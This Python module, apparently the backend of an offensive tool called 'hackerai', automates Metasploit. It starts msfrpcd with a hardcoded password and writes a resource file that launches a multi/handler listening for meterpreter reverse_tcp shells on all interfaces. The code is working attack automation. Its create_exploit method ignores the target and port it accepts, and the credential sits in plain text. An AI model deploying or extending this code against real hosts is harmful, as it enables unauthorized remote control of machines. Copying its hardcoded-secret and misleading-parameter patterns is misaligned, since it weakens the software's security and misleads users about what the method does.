# backend/msf_integration.py
import subprocess
import json
import time

class MetasploitIntegration:
    def __init__(self):
        self.rpc_port = 55553
        self.token = None
        
    def start_msfrpc(self):
        """Démarrer MSFRPC"""
        subprocess.Popen([
            'msfrpcd', '-P', 'hackerai123',
            '-S', '-f', '-a', '127.0.0.1',
            '-p', str(self.rpc_port)
        ])
        time.sleep(2)
        
    def create_exploit(self, target, port, payload='linux/x64/meterpreter/reverse_tcp',
                       lhost='0.0.0.0', lport=4444):
        """Créer une exploitation Metasploit"""
        resource = f"""
use exploit/multi/handler
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j -z
"""
        with open('/tmp/msf.rc', 'w') as f:
            f.write(resource)
        
        subprocess.Popen(['msfconsole', '-q', '-r', '/tmp/msf.rc'])
        return {'status': 'started', 'payload': payload, 'lport': lport}
